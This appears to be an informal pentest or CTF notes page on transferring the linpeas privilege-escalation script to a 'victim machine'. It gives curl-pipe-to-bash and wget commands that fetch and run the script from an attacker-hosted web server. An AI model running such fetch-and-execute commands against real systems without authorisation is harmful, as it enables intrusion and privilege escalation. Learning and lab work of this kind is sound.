# Using linpeas on the victim machine

In case you're looking for something (cronjob, file with escalated privileges, etc.) for privilege escalation, but you're not sure how to go about it, go into _/tmp_ and download there to get linpeas onto the system. It's amateur since it automates the enumeration but well, I am an amateur so lmao.

Anyways, _linpeas_ has to be uploaded one way or another to the victim machine to be able to use it. It's just a shell script, but there are multiple ways to get it there.

## Method 1 - Curl

**Step 1:** Set up a _Python Web Server_ in the directory with the _linpeas.sh_ file

![image](https://github.com/user-attachments/assets/7c405d31-8c17-4448-a217-8dcf44b96706)

**Step 2:** After it's hosted, ```curl``` it and pipe it immediately into _bash_ to run it immediately, like so:

```
curl http://[IP Address]:[Port]/linpeas.sh | bash
```

**Step 3:** Stonks

![image](https://github.com/user-attachments/assets/13e05253-468e-43a8-be55-60d5e3eca616)

## Method 2 - Wget

**Step 1:** Repeat of step 1 in method 1

**Step 2:** Pretty much the same thing, but this time use ```wget```:

```
wget http://[IP Address]:[Port]/linpeas.sh
```

**Step 3:** Since you're not executing it directly after getting it like in method 1, be sure to check permissions of _linpeas.sh_ and make sure it's executable, if not, do this:

```
chmod +x linpeas.sh
```

Then check again using ```ls -l```

**Step 4:** Execute the script
